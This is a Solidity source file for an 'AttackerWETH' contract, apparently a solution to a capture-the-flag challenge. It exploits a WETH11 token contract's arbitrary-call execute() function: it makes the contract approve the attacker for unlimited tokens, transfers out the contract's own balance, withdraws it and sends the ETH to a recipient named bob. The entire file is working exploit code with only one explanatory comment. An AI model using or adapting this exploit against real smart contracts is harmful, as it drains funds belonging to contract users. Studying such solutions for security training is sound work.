// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWETH11 {
    function execute(
        address receiver,
        uint256 amount,
        bytes calldata data
    ) external;

    function approve(address spender, uint256 amount) external;

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function withdrawAll() external;
}

contract AttackerWETH {
    address payable immutable bob;
    IWETH11 immutable weth11;
    address immutable challengeaddress;

    constructor(address _bob, address _addr) {
        bob = payable(_bob);
        weth11 = IWETH11(_addr);
        challengeaddress = _addr;
    }

    function attack() external payable {
        // we approve all the token balance of contract WETH11 to address(this)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        weth11.execute(address(weth11), 0, data);
        weth11.transferFrom(
            address(weth11),
            address(this),
            address(weth11).balance
        );
        weth11.withdrawAll();
        bob.transfer(address(this).balance);
    }

    receive() external payable {}
}
